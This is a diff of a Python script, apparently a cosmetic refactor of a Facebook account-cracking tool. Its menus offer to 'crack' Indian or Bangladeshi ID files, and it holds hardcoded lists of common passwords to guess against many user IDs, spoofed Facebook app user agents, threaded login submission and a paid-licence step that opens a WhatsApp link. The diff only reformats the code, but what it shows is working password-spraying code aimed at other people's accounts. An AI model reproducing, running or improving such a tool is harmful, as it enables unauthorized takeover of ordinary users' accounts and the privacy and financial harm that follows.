@@ -1,4 +1,11 @@
-import os, sys, uuid, re, random, time, string, json, base64
+import base64
+import os
+import random
+import re
+import string
+import sys
+import time
+import uuid
 from io import BytesIO
 
 try:
@@ -43,7 +50,9 @@ class sort:
         cx = random.choice(co)
         return cx
 
+
 ua = []
+
 
 def live_update():
     try:
@@ -63,9 +72,6 @@ def live_update():
 
 
 live_update()
-
-
-
 
 
 def info():
@@ -182,6 +188,7 @@ def Samsung():
         random.choice(range(1500, 2000))) + "};FB_FW/1;]"
     return ua
 
+
 def dd(fbbd, device):
     if fbbd.lower() == "samsung":
         return random.choice(
@@ -221,6 +228,8 @@ def dd(fbbd, device):
         return random.choice(["CG8", "CG8h", "LB8", "LB8a", "CH7n", "CH7", "LH6n"])
     else:
         return device
+
+
 # -----------#
 def Motorola():
     fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
@@ -276,10 +285,12 @@ def generate_random_string(lowercase_count, numeric_count):
 
     return lowercase_part + numeric_part
 
+
 def shuffle_string(s):
     shuffled_list = list(s)
     random.shuffle(shuffled_list)
     return ''.join(shuffled_list)
+
 
 lowercase_count = 16
 numeric_count = 18
@@ -292,10 +303,6 @@ shuffled_cid = shuffle_string(ran_string)
 
 random_string = generate_random_string(lowercase_count, numeric_count)
 shuffled_connection_token = shuffle_string(random_string)
-
-
-
-
 
 
 def old():
@@ -347,14 +354,14 @@ def old():
 def filee():
     sort.clear()
     sort.logo()
-
+    pwx = []
     print("[b]    [red1][A] [sea_green2]Crack Indian File")
     print("[b]    [red1][B] [spring_green1]Crack BD File")
     print(sort.line())
     ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
     if ask in ["1", "01", "a", "A"]:
         print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND File Clone")
-        print(sort .line())
+        print(sort.line())
         time.sleep(2)
         pwx = ["07860786", "57575751", "57575752", "57273200", "59039200", "first123", "first 123", "first1234",
                "First123", "First1234", "first@123", "first last", "First Last", "firstlast", "firstlast123",
@@ -386,7 +393,7 @@ def filee():
     print("[b]     [red1]✗ [chartreuse1]Add Pass  [orange3]▶  [chartreuse1](Y/n)")
     pa = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
     if pa in ["y", "Y", "yes", "Yes", "1"]:
-        pwx = []
+
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]Add Limit [orange3]▶  [chartreuse1]Example 10, 15, 20")
         lim = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
@@ -409,7 +416,6 @@ def filee():
     print("  [r dark_olive_green1]Π7[/r dark_olive_green1][b violet] Method 7")
     print("  [r dark_olive_green1]Π8[/r dark_olive_green1][b violet] Method 8")
 
-
     print(sort.line())
     meth = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
 
@@ -419,13 +425,13 @@ def filee():
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(file)))
         print(" [b]    [red1]✗ [light_green]Method    [orange3]▶  [light_green]M" + meth)
         print(sort.line())
-        for mal in file:
-            try:
+        try:
+            for mal in file:
                 uid = mal.split("|")[0]
                 name = mal.split("|")[1]
                 heron.submit(file_sub, uid, pwx, name, meth, file)
-            except:
-                pass
+        except:
+            pass
 
 
 def file_sub(uid, pwx, name, meth, file):
@@ -434,7 +440,7 @@ def file_sub(uid, pwx, name, meth, file):
     custom_agent = ""
     try:
         sys.stdout.write(
-            f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
+            f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}PRINCE-M{meth}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
         sys.stdout.flush()
         fs = name.split(' ')[0]
         try:
@@ -621,7 +627,8 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:],"bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####",
+                       "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -816,7 +823,7 @@ def approve():
 
         print("your Key ->   " + showkey)
         input("This is paid tool bro. If you want to buy press enter. ")
-        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey);
+        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey)
         os.system('am start https://wa.me/+8801617687239?text=' + tks)
         sys.exit()
 
